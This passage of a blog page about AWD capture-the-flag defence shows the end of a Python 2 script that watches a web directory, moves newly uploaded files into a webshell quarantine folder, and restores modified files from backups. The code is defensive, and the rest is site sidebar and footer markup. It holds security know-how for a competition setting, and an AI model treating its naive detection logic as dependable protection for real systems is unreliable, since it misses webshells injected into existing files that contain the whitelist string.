class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">'bak'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'---------start------------'</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filepath, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] webshell find : '</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">'webshell'</span>], ntpath.basename(filepath) + <span class="string">'.txt'</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) + <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = open(filekey, <span class="string">'r'</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="string">'log'</span>], <span class="string">'log.txt'</span>), <span class="string">'a'</span>)</span><br><span class="line">                        f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print '[*] ' + getUnicode(time.ctime())</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#AWD"><span class="nav-number">1.</span> <span class="nav-text">AWD</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、确定环境是密码登录还是密钥登录"><span class="nav-number">1.1.</span> <span class="nav-text">1、确定环境是密码登录还是密钥登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、迅速备份源码和数据库到本机"><span class="nav-number">1.2.</span> <span class="nav-text">2、迅速备份源码和数据库到本机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、找配置文件-amp-mysql一些操作"><span class="nav-number">1.3.</span> <span class="nav-text">3、找配置文件&amp;mysql一些操作</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附加"><span class="nav-number">2.</span> <span class="nav-text">附加</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
